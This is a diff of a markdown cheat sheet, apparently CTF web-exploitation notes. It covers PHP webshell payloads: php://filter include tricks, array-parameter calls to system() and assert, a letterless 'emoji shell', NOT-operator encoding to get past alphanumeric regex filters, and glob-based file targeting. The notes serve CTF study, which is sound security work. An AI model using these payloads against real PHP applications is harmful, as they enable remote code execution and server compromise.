@@ -57,13 +57,14 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 ?1[]=blah&1[]=system();&2=assert     
 param=usort(...$_GET);
 ```
-How to bypass the length limit：  
-* Build command with filename, then ls all thing into shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
+👾How to bypass the length limit：  
+* Build command with filename, then `ls` all thing into shell script [HITCON CTF](http://taiwan.1pwnch.com/web/ctf/2018/02/20/A-tiny-shell/#more)
 
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
 **exec() and shell_exec() all need echo**  
 [Awesome analysis of php lib exp](https://stackoverflow.com/questions/3115559/exploitable-php-functions)  
-
+  
+👾Emoji shell:  
 ```php
 // Use dot. to concat
 $😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;
@@ -80,13 +81,18 @@ From `Meepwn Quals 2018`, I use such shell without text, you can also replace th
 [VXCTF2018](https://github.com/shinmao/CTF-writeups/tree/master/vxcon2018)  
 
 
-Here comes another advanced problem:  
+👾Here comes another advanced problem:  
 ```php
 preg_match("/[A-Za-z0-9_$]+/",$a)
 eval($a);
 ```  
 I cannot use `$` to create variable anymore, how should I do?  
 In php7.0, there is a new way to run function dynamically such as `('phpinfo')();`, with this way we shorten the length of string. For the limitation on alphanumeric character, we can use **NOT** operator to transform it: `(~%8F%97%8F%96%91%99%90)();`.   
+In addition to new way in php7.0, **using glob** can also help us a lot. `[x]` is also the member of Linux glob and we can use it just like regex to target specific file just like following:  
+```php
+ls /??/??[^_][A-Z]
+```  
+This means list the file the last two words of whose are not `_` and in range of A to Z. Awesome!!
 
 # Bypass blacklist extension  
 [服务器针对文件的解析漏洞汇总](https://mp.weixin.qq.com/s/f0y_AjRtc4NjEqeJe6cPhw)  
